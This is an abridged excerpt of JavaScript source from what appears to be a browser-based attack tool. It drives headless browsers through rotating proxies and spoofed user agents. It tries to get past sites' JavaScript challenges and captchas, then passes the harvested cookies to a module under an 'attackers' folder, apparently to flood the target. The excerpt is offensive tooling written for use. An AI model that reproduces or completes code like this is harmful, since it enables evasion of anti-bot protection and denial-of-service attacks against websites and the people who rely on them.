...
async function prepare_browser(args) {
    if (proxies.length < 1) return log("All browsers created lol");
...
async function browser_create(args, proxy, useragent) {
    const options = {
        args: [
            ...
            '--window-size=600,400',
            '--no-zygote',
            '--single-process', //remove this if win
            '--disable-gpu'
        ],
    ...
    try {
        ...
        //log(`${browser.process().pid} spawned.`);
...
async function browser_jschecker(browser, page, args, config) {
    try {
        ...
        if (!(protection)) {
            ...
            if (againJs(protection.name, config)) return browser_finish(browser, page, args, config, `why ${protection.name}`)
...
async function browser_captcha(browser, page, args, config, lmao) {
    ...
    if(solutions > args.max_captchas){
        return browser_finish(browser, page, args, config, 'cant bypass captchas cause limit lol');
    }
    ...
    if (!(body == false)) {
        return browser_finish(browser, page, args, config, 'cant bypass captcha (immortal wtf)');
    }
...
async function browser_move(browser, page, args, config) {
    try {
        ...
        log(`${config.pid} [Movement] Title: ${await page.title()}`);
        require('../attackers/attacker.js')(args, config.proxy, config.useragent, normal_cookies(await page.cookies()))
